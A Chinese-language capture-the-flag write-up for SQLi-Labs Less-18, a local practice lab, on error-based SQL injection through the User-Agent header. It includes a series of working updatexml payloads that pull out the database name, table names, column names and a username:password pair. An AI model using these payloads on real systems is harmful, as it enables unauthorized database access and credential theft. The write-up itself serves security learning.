【SQLi-Labs】Less-18 头部注入（User-Agent）Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, Header注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-18 (POST - Header Injection - Uagent field - Error based)
  • 提示：POST请求，HTTP头部注入（User-Agent字段），基于报错

2. 解题思路与前置原理

本关卡的注入点不在表单的 uname 或 passwd 字段，而是在 HTTP 请求头中的 User-Agent 字段。

后台逻辑大概率为：当用户登录成功后，执行 INSERT INTO uagents (uagent, ip_address, username) VALUES ('$uagent', '$IP', '$uname')，将用户的 User-Agent 记录到数据库中。由于对 $uagent 未做过滤，导致注入。

关键技巧：闭合与绕过

在 HTTP 请求头中，行尾的空格和换行极易被吞掉，导致常规注释符 # 或 --+ 失效。因此，使用 ' or updatexml(...) or ' 的语法结构：先闭合前面的单引号变空字符，插入报错函数，最后用 or ' 补齐后面的单引号，实现无注释符的完美逃逸。

3. 操作步骤与解析

前提条件：必须使用正确的账号密码登录成功（如 admin/123456），页面回显 SUCCESSFULLY LOGGED IN，后台才会触发 INSERT 语句。

第一步：抓包与定位注入点

使用 Burp Suite 拦截登录请求，发送至 Repeater。定位到请求头中的 User-Agent 字段。

第二步：利用 User-Agent 进行报错注入

依次替换 User-Agent 的值为以下 Payload：

1. 确认注入与当前库名：

User-Agent: ' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '

回显：XPATH syntax error: '~security~'。

2. 获取表名（注意限制库名）：

User-Agent: ' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '

回显：XPATH syntax error: '~emails,referrers,uagents,users~'。

3. 获取列名：

User-Agent: ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) or '

注：0x7573657273 是 users 的十六进制。此处若不限制 table_schema，会查出系统库同名表的列名（如 USER, CURRENT_CONNECTIONS），造成数据污染。

回显：XPATH syntax error: '~id,username,password~'。

4. 提取账号密码：

User-Agent: ' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) or '

注：受限于报错 32 字符长度限制，这里使用 limit 0,1 仅提取第一行数据。

回显：XPATH syntax error: '~Dumb:Dumb~'。

4. 踩坑记录与复盘

  • 登录前置：必须先正常登录，否则后台不会执行写库操作，User-Agent 里的任何 Payload 都不会被执行。
  • 注释符失效：Header 注入中，行尾的 # 或 -- 极易因空格丢失导致闭合失败。掌握 ' or 表达式 or ' 的补齐技巧是破局关键。
  • 跨库数据污染：查询 information_schema 时，务必使用 table_schema=database() 严格限定当前库，避免查出系统元数据造成的混淆。

5. 知识点总结

  • Header 注入：突破仅关注 GET/POST 参数的思维局限，将 Payload 植入 User-Agent、Cookie、X-Forwarded-For 等 HTTP 头部字段。
  • 无注释符闭合：利用逻辑运算符和空字符，在不依赖注释符的情况完成 SQL 语句的逃逸与重构。
